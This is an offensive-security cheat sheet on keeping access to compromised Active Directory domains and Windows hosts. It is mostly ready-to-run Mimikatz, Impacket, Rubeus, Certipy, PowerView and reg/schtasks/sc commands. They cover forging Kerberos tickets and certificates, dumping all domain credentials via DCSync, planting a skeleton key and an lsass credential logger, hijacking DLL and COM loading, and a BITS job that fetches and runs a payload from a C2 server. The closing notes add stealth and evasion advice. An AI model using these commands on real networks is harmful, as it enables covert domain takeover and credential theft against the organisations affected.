# AD/Windows Persistence

Persistence mechanisms for maintaining access after initial compromise. Split into domain-level (requires domain privileges) and host-level (requires local admin) techniques.

## Quick Reference: Stealth Comparison

| Technique | Survives Reboot | Survives PW Change | Detection (1-5) | Cleanup (1-5) | Domain Admin Req |
|-----------|----------------|-------------------|-----------------|---------------|------------------|
| Golden Ticket | N/A (in-memory) | Yes (uses krbtgt) | 5 | 1 | Yes |
| Silver Ticket | N/A (in-memory) | Yes (uses svc hash) | 4 | 1 | No (needs hash) |
| Diamond Ticket | N/A (in-memory) | Yes | 5 | 1 | No (needs key) |
| DCSync Rights | Yes | Yes | 3 | 4 | Yes |
| AdminSDHolder | Yes | Yes | 2 | 5 | Yes |
| DCShadow | Yes | Yes | 4 | 5 | Yes |
| Skeleton Key | No | Yes | 2 | 1 | Yes |
| AD CS Golden Cert | N/A (cert-based) | Yes | 5 | 2 | Yes (CA backup) |
| SID History | Yes | Yes | 3 | 4 | Yes |
| Machine Account | Yes | Yes | 4 | 2 | No (needs quota) |
| GPO Abuse | Yes | Yes | 2 | 3 | Yes (or GPO write) |
| Registry Run Key | Yes | Yes | 1 | 1 | No |
| Scheduled Task | Yes | Yes | 1 | 1 | No |
| WMI Event | Yes | Yes | 3 | 3 | No |
| Service | Yes | Yes | 1 | 1 | No |
| DLL Hijack | Yes | Yes | 3 | 2 | No |
| COM Hijack | Yes | Yes | 4 | 3 | No |
| SSP | Yes | Yes | 2 | 3 | Yes (SYSTEM) |

---

## Domain-Level Persistence

### Golden Ticket

Forge Kerberos TGTs using the krbtgt NTLM hash. Valid for any user until krbtgt password changes (default: never).

**Mimikatz:**
```powershell
# Dump krbtgt hash first via DCSync
mimikatz # lsadump::dcsync /domain:$DOMAIN /user:krbtgt

# Forge ticket
mimikatz # kerberos::golden /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$KRBTGT_HASH /id:500 /ptt

# Optional: specify groups, ticket lifetime, endin time
mimikatz # kerberos::golden /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$KRBTGT_HASH /id:500 /groups:512,513,518,519,520 /startoffset:0 /endin:43200 /renewmax:43200 /ptt
```

**Impacket ticketer.py:**
```bash
ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator

# Inject into current session
export KRB5CCNAME=Administrator.ccache
```

**Rubeus:**
```powershell
Rubeus.exe golden /rc4:$KRBTGT_HASH /domain:$DOMAIN /sid:$DOMAIN_SID /user:Administrator /id:500 /ptt
```

**Key Points:**
- Ticket valid ~10 years by default (mimikatz default)
- Does NOT touch network until used
- Invalidated only by krbtgt password reset (twice, to clear history)
- Can specify ANY user, including non-existent ones

---

### Silver Ticket

Forge service tickets (TGS) for specific services using the service account hash. Survives user password changes but not service account password changes.

**Mimikatz:**
```powershell
# CIFS/SMB service for file access
mimikatz # kerberos::golden /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /target:$TARGET_HOST /service:cifs /rc4:$SERVICE_NTLM_HASH /ptt

# HTTP service for web apps
mimikatz # kerberos::golden /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /target:$TARGET_HOST /service:http /rc4:$SERVICE_NTLM_HASH /ptt

# LDAP service for directory queries
mimikatz # kerberos::golden /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /target:$DC /service:ldap /rc4:$SERVICE_NTLM_HASH /ptt

# HOST service for scheduled tasks, WMI
mimikatz # kerberos::golden /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /target:$TARGET_HOST /service:host /rc4:$SERVICE_NTLM_HASH /ptt
```

**Impacket ticketer.py:**
```bash
# CIFS service
ticketer.py -nthash $SERVICE_NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$TARGET_HOST Administrator

export KRB5CCNAME=Administrator.ccache
```

**Common Service SPNs:**
- `cifs/$HOST` - SMB file shares
- `http/$HOST` - Web services
- `ldap/$HOST` - LDAP queries
- `host/$HOST` - Scheduled tasks, remote registry, Windows Remote Management
- `mssql/$HOST` - SQL Server
- `wsman/$HOST` - PowerShell remoting

---

### Diamond Ticket

Modified TGT that appears legitimate because it's obtained from the DC but modified before use. More opsec-safe than golden tickets.

**Rubeus:**
```powershell
# Request TGT, decrypt, modify, re-encrypt
Rubeus.exe diamond /krbkey:$KRBTGT_AES256_KEY /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /ptt

# Using RC4 instead of AES
Rubeus.exe diamond /krbkey:$KRBTGT_NTLM_HASH /enctype:rc4 /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /ptt

# Specify custom domain controller
Rubeus.exe diamond /krbkey:$KRBTGT_AES256_KEY /ticketuser:Administrator /ticketuserid:500 /groups:512 /dc:$DC /ptt
```

**Advantages:**
- Requests legitimate TGT from DC (appears in normal logs)
- Modifies PAC locally before use
- Better opsec than purely forged golden tickets
- Requires krbtgt AES key or NTLM hash (same as golden)

---

### DCSync

Replicate credentials from domain controllers using Directory Replication Service (DRS) protocol. Becomes persistence when rights are granted to controlled accounts.

**Impacket secretsdump.py:**
```bash
# Dump all domain credentials
secretsdump.py $DOMAIN/$USER:$PASS@$DC

# Dump specific user
secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt

# Use hash instead of password
secretsdump.py $DOMAIN/$USER@$DC -hashes :$NTLM_HASH

# Dump NTDS.dit history
secretsdump.py $DOMAIN/$USER:$PASS@$DC -history
```

**Mimikatz:**
```powershell
# Dump specific user
mimikatz # lsadump::dcsync /domain:$DOMAIN /user:krbtgt

# Dump all users
mimikatz # lsadump::dcsync /domain:$DOMAIN /all /csv
```

**PowerView (grant DCSync rights to user):**
```powershell
# Grant Replicating Directory Changes + Replicating Directory Changes All
Add-DomainObjectAcl -TargetIdentity "DC=$DOMAIN,DC=local" -PrincipalIdentity $USER -Rights DCSync

# Manual ACL addition
Add-DomainObjectAcl -TargetIdentity "DC=$DOMAIN,DC=local" -PrincipalIdentity $USER -Verbose -Rights All
```

**BloodHound Cypher (identify who has DCSync):**
```cypher
MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:GetChanges|GetChangesAll]->(d:Domain {name: "$DOMAIN"}) RETURN u.name
```

---

### AdminSDHolder Abuse

Modify the AdminSDHolder container DACL to grant yourself permissions that auto-propagate to protected groups every 60 minutes.

**PowerView:**
```powershell
# Add FullControl to user on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=$DOMAIN,DC=local" -PrincipalIdentity $USER -Rights All -Verbose

# Wait 60 minutes for SDProp, or trigger manually
Invoke-SDPropagator

# Verify propagation
Get-DomainObjectAcl -Identity "CN=Domain Admins,CN=Users,DC=$DOMAIN,DC=local" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match $USER_SID}
```

**Manual (ADSI Edit):**
1. Connect to `CN=AdminSDHolder,CN=System,DC=$DOMAIN,DC=local`
2. Modify Security → Add user with Full Control
3. Wait for SDProp (~60 min) or trigger via `Invoke-SDPropagator`

**Protected Groups (auto-inherit from AdminSDHolder):**
- Domain Admins
- Enterprise Admins
- Schema Admins
- Administrators
- Account Operators
- Backup Operators
- Server Operators
- Print Operators
- Domain Controllers
- Read-only Domain Controllers
- Replicator

---

### DCShadow

Register a rogue domain controller to push malicious replication updates to the real DC. Requires DA and SYSTEM on compromised host.

**Mimikatz (two sessions required):**
```powershell
# Session 1 (as SYSTEM): Register rogue DC
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:$TARGET_USER /attribute:SIDHistory /value:$ENTERPRISE_ADMINS_SID

# Session 2 (as DA): Push replication
mimikatz # lsadump::dcshadow /push
```

**Common Abuse Scenarios:**
- Add SIDHistory to user → instant Enterprise Admin
- Modify `servicePrincipalName` → enable Kerberoasting
- Change `userAccountControl` → disable account protections
- Modify `primaryGroupID` → group membership manipulation

**Requirements:**
- Domain Admin rights (to register DC)
- SYSTEM on host (to modify service registrations)
- Network access to DC on replication ports

---

### Skeleton Key

Inject master password ("mimikatz" by default) that works for all domain accounts without disrupting legitimate passwords.

**Mimikatz:**
```powershell
# Inject skeleton key (requires DA, runs on DC)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now authenticate as any user with password "mimikatz"
net use \\$DC\C$ /user:$DOMAIN\Administrator mimikatz
```

**Detection/Limitations:**
- Does NOT survive reboot
- Highly detectable (modifies lsass.exe on DC)
- Windows event 7045 (service installation) if persistence added
- Requires disabling LSA protection if enabled

---

### AD CS Golden Certificate

Backup CA certificate and forge arbitrary certificates for any user. Persists indefinitely until CA cert expires (years).

**Certipy:**
```bash
# 1. Backup CA certificate (requires DA or CA admin)
certipy ca -backup -ca '$CA_NAME' -username $USER@$DOMAIN -password $PASS -dc-ip $DC

# 2. Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject "CN=Administrator,CN=Users,DC=$DOMAIN,DC=local" -out administrator_forged.pfx

# 3. Authenticate with forged cert
certipy auth -pfx administrator_forged.pfx -dc-ip $DC
```

**Mimikatz (export CA cert):**
```powershell
# Export CA cert and key from CA server
mimikatz # crypto::capi
mimikatz # crypto::certificates /systemstore:local_machine /store:my /export
```

**Advantages:**
- Valid until CA cert expires (10+ years typical)
- Survives password changes
- No unusual authentication patterns (cert auth is normal)

---

### SID History Injection

Add Enterprise Admin or Domain Admin SID to user's SID history. User gains those privileges without direct group membership.

**Mimikatz:**
```powershell
# Inject SID (requires DA)
mimikatz # sid::add /sid:$ENTERPRISE_ADMINS_SID /sam:$TARGET_USER

# Inject using SID::patch (alternative)
mimikatz # sid::patch
mimikatz # sid::add /new:$ADMIN_SID /sam:$TARGET_USER
```

**PowerView:**
```powershell
# Using ADSI (no direct PowerView command, use Set-ADUser)
Set-ADUser $TARGET_USER -Add @{sidHistory=$ENTERPRISE_ADMINS_SID}
```

**Impacket raiseChild.py (automated for child→parent domain):**
```bash
raiseChild.py -target-exec $PARENT_DC $CHILD_DOMAIN/$USER:$PASS
```

**Detection:**
- Unusual SID history entries (check with `Get-ADUser -Property SIDHistory`)
- Event ID 4765 (SID History added)

---

### Machine Account Persistence

Create or compromise a machine account. Machine accounts rarely expire and can authenticate indefinitely.

**PowerMad (create machine account):**
```powershell
# Create new machine account (default user quota: 10)
New-MachineAccount -MachineAccount $MACHINE_NAME -Password $(ConvertTo-SecureString '$PASS' -AsPlainText -Force)

# Verify creation
Get-ADComputer -Identity $MACHINE_NAME
```

**Impacket addcomputer.py:**
```bash
addcomputer.py -computer-name '$MACHINE_NAME$' -computer-pass '$PASS' -dc-ip $DC $DOMAIN/$USER:$PASS
```

**Authentication with machine account:**
```bash
# Use machine account to authenticate
secretsdump.py $DOMAIN/'$MACHINE_NAME$':'$PASS'@$DC

# Request TGT
getTGT.py -dc-ip $DC $DOMAIN/'$MACHINE_NAME$':'$PASS'
```

**Advantages:**
- Machine accounts rarely audited
- No password expiration by default
- Can be created by any domain user (up to quota)

---

### GPO Abuse

Deploy persistence via Group Policy Objects if you have write access to GPO or GPO-linked OUs.

**PowerView (enumerate writable GPOs):**
```powershell
# Find GPOs you can modify
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match $USER_SID}

# Check GPO links to identify affected OUs
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty"}
```

**SharpGPOAbuse:**
```powershell
# Add startup script to writable GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c $PAYLOAD" --GPOName "$GPO_NAME"

# Add immediate scheduled task
SharpGPOAbuse.exe --AddUserTask --TaskName "UserDebug" --Author "$DOMAIN\$USER" --Command "powershell.exe" --Arguments "-NoP -C $PAYLOAD" --GPOName "$GPO_NAME"
```

**Manual (GPMC):**
1. Open Group Policy Management Console (gpmc.msc)
2. Edit target GPO → Computer Configuration → Windows Settings → Scripts → Startup
3. Add malicious script
4. Wait for GPO refresh (~90 min) or force: `gpupdate /force /target:computer`

---

## Host-Level Persistence

### Registry Run Keys

Classic Windows startup persistence via registry. Multiple locations for different privilege levels.

**HKLM (requires admin):**
```powershell
# Run key (visible, low stealth)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "$NAME" /t REG_SZ /d "$PAYLOAD" /f

# RunOnce (executes once, then deletes)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "$NAME" /t REG_SZ /d "$PAYLOAD" /f

# RunServices (legacy, still works)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /v "$NAME" /t REG_SZ /d "$PAYLOAD" /f
```

**HKCU (current user only):**
```powershell
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "$NAME" /t REG_SZ /d "$PAYLOAD" /f
```

**Stealth locations (less monitored):**
```powershell
# Winlogon userinit
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,$PAYLOAD" /f

# Winlogon shell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,$PAYLOAD" /f

# Policy Explorer Run
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "$NAME" /t REG_SZ /d "$PAYLOAD" /f
```

---

### Scheduled Tasks

High-fidelity persistence with flexible triggers. Can run as SYSTEM or any user.

**Create task (SYSTEM context):**
```cmd
schtasks /create /tn "$TASK_NAME" /tr "$PAYLOAD" /sc onlogon /ru SYSTEM /f
```

**Create task (specific user):**
```cmd
schtasks /create /tn "$TASK_NAME" /tr "$PAYLOAD" /sc onlogon /ru "$DOMAIN\$USER" /rp "$PASS" /f
```

**Stealthy triggers:**
```cmd
# Daily at specific time
schtasks /create /tn "$TASK_NAME" /tr "$PAYLOAD" /sc daily /st 14:00 /ru SYSTEM /f

# On system idle
schtasks /create /tn "$TASK_NAME" /tr "$PAYLOAD" /sc onidle /i 10 /ru SYSTEM /f

# On event log trigger (advanced)
schtasks /create /tn "$TASK_NAME" /tr "$PAYLOAD" /sc onevent /ec Security /mo "*[System[(EventID=4624)]]" /ru SYSTEM /f
```

**PowerShell method (more options):**
```powershell
$Action = New-ScheduledTaskAction -Execute "$PAYLOAD"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -TaskName "$TASK_NAME" -Force
```

---

### WMI Event Subscription

Fileless persistence using WMI event consumers. Survives reboot, harder to detect.

**PowerShell (full chain):**
```powershell
# 1. Create event filter (trigger)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "$FILTER_NAME"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 2. Create command line consumer (payload)
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "$CONSUMER_NAME"
    CommandLineTemplate = "$PAYLOAD"
}

# 3. Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

**Enumerate existing WMI persistence:**
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

**Remove WMI persistence:**
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FILTER_NAME'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$CONSUMER_NAME'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%$FILTER_NAME%'" | Remove-WmiObject
```

---

### Service Creation

Traditional Windows service persistence. High privileges, survives reboot.

**Create service:**
```cmd
sc create $SERVICE_NAME binpath= "$PAYLOAD" start= auto
sc description $SERVICE_NAME "Windows Update Agent"
sc start $SERVICE_NAME
```

**Create delayed service (less suspicious):**
```cmd
sc create $SERVICE_NAME binpath= "$PAYLOAD" start= delayed-auto
```

**PowerShell:**
```powershell
New-Service -Name "$SERVICE_NAME" -BinaryPathName "$PAYLOAD" -StartupType Automatic -Description "Windows Update Agent"
Start-Service -Name "$SERVICE_NAME"
```

**Modify existing service (stealthier):**
```cmd
sc config $EXISTING_SERVICE binpath= "$PAYLOAD"
sc qc $EXISTING_SERVICE
```

---

### DLL Search Order Hijacking

Place malicious DLL in writable location where application searches before legitimate path.

**Common hijack locations:**
1. Application directory (if writable)
2. Current directory
3. System directories (`C:\Windows\System32`)
4. Directories in PATH

**Identify vulnerable applications:**
```powershell
# Process Monitor (Procmon) filters:
# - Path contains .dll
# - Result is "NAME NOT FOUND"
# - Process name of interest
```

**Example: Exploit missing DLL in app directory:**
```cmd
# If app.exe looks for missing.dll in C:\Program Files\App\
copy $MALICIOUS_DLL "C:\Program Files\App\missing.dll"
```

---

### COM Object Hijacking

Redirect COM object instantiation to malicious DLL.

**Hijack user-level COM (HKCU):**
```powershell
# 1. Find COM object (example: {CLSID})
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32"

# 2. Copy to HKCU to hijack for current user
reg add "HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32" /ve /t REG_SZ /d "$MALICIOUS_DLL" /f
```

**Enumerate hijackable COM objects:**
```powershell
# Find COM objects with DLL paths
Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -Recurse -ErrorAction SilentlyContinue | Get-ItemProperty -Name "(Default)" -ErrorAction SilentlyContinue | Where-Object {$_."(Default)" -like "*.dll"}
```

---

### Startup Folder

Simplest persistence. Executes on user logon.

**Current user:**
```cmd
copy $PAYLOAD "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe"
```

**All users (requires admin):**
```cmd
copy $PAYLOAD "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe"
```

**PowerShell:**
```powershell
Copy-Item $PAYLOAD "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe"
```

---

### Security Support Provider (SSP)

Inject custom DLL into lsass.exe to capture credentials. Requires SYSTEM.

**Mimikatz mimilib.dll method:**
```powershell
# 1. Copy mimilib.dll to System32
copy mimilib.dll C:\Windows\System32\

# 2. Register as SSP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "mimilib.dll" /f

# 3. Reboot or inject into current lsass (in-memory)
mimikatz # misc::memssp
```

**Credentials logged to:**
```
C:\Windows\System32\mimilsa.log
```

---

### BITS Job Persistence

Use Background Intelligent Transfer Service for stealthy callbacks.

**Create BITS job:**
```powershell
# Download and execute payload on schedule
bitsadmin /create $JOB_NAME
bitsadmin /addfile $JOB_NAME "http://$C2_SERVER/payload.exe" "C:\Windows\Temp\payload.exe"
bitsadmin /SetNotifyCmdLine $JOB_NAME "C:\Windows\Temp\payload.exe" ""
bitsadmin /resume $JOB_NAME
```

**PowerShell BITS:**
```powershell
Start-BitsTransfer -Source "http://$C2_SERVER/payload.exe" -Destination "C:\Windows\Temp\payload.exe" -Asynchronous -Priority Foreground
```

**Enumerate BITS jobs:**
```cmd
bitsadmin /list /allusers /verbose
```

---

## Operational Notes

**Persistence Selection:**
- **Golden Ticket**: Best for long-term domain persistence, use when krbtgt is stable
- **DCSync Rights**: Stealthy, allows on-demand credential harvesting
- **AdminSDHolder**: Auto-propagates, hard to remove completely
- **Machine Account**: Reliable, under-monitored, easy to create
- **Scheduled Task**: Flexible, good for host persistence
- **WMI Event**: Fileless, harder to detect than registry keys

**Cleanup Priority (highest to lowest risk if left):**
1. Skeleton Key (highly detectable, DC-resident)
2. DCShadow replication artifacts
3. SSP DLLs in System32
4. Scheduled tasks with suspicious names/paths
5. Registry Run keys
6. BITS jobs
7. WMI event subscriptions
8. COM hijacks
9. Machine accounts (low priority, often ignored)
10. DCSync rights on service accounts (very low detection)

**OPSEC Considerations:**
- Domain-level: Always prefer rights/ACL modifications over in-memory artifacts
- Host-level: Scheduled tasks > WMI events > Registry Run keys (stealth)
- Test persistence in lab before production use
- Document all persistence for cleanup
- Avoid naming that suggests compromise ("backdoor", "pwn", etc.)
